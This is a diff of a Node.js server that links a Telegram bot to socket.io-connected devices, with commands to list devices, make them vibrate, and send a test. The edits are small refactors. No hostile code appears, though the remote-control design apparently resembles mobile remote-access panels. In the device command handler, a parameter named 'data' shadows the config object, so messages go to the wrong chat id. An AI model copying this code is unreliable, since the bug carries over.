@@ -11,7 +11,7 @@ const app = express();
 const server = http.createServer(app);
 const io = new Server(server, {
     cors: { origin: "*" },
-    transports: ['websocket', 'polling'] // الأهم: تحديد نوع النقل
+    transports: ['websocket', 'polling']
 });
 
 const bot = new telegramBot(data.token, { polling: true });
@@ -24,7 +24,7 @@ bot.onText(/\/start/, (msg) => {
             keyboard: [
                 ['📱 Devices'],
                 ['📳 Vibrate'],
-                ['🔔 Test Notification']
+                ['🔔 Test']
             ],
             resize_keyboard: true
         }
@@ -37,11 +37,11 @@ bot.onText(/📱 Devices/, (msg) => {
         bot.sendMessage(data.id, '❌ No devices connected');
         return;
     }
-    let msg = '📱 Connected devices:\n';
+    let message = '📱 Connected devices:\n';
     for (const [id, device] of connectedDevices) {
-        msg += `- ${device.name} (${device.model})\nID: ${id}\n`;
+        message += `- ${device.name} (${device.model})\nID: ${id}\n`;
     }
-    bot.sendMessage(data.id, msg);
+    bot.sendMessage(data.id, message);
 });
 
 // ========== أمر الاهتزاز ==========
@@ -53,11 +53,12 @@ bot.onText(/📳 Vibrate/, (msg) => {
     const [deviceId] = connectedDevices.keys();
     console.log(`📳 Sending vibrate to: ${deviceId}`);
     io.to(deviceId).emit('command', { request: 'vibrate' });
-    bot.sendMessage(data.id, `📳 Vibrate command sent to ${connectedDevices.get(deviceId).name}`);
+    const device = connectedDevices.get(deviceId);
+    bot.sendMessage(data.id, `📳 Vibrate command sent to ${device.name}`);
 });
 
 // ========== أمر اختبار ==========
-bot.onText(/🔔 Test Notification/, (msg) => {
+bot.onText(/🔔 Test/, (msg) => {
     if (connectedDevices.size === 0) {
         bot.sendMessage(data.id, '❌ No devices connected');
         return;
@@ -78,7 +79,7 @@ io.on('connection', (socket) => {
     console.log(`✅ Device connected: ${deviceName} (${deviceModel})`);
     bot.sendMessage(data.id, `✅ Device connected: ${deviceName}`);
 
-    // استقبال الأوامر من الجهاز (للتأكد من أن الجهاز يستقبل)
+    // استقبال الأوامر من الجهاز
     socket.on('command', (data) => {
         console.log(`📩 Command from device: ${JSON.stringify(data)}`);
         bot.sendMessage(data.id, `📩 Device received: ${data.request}`);
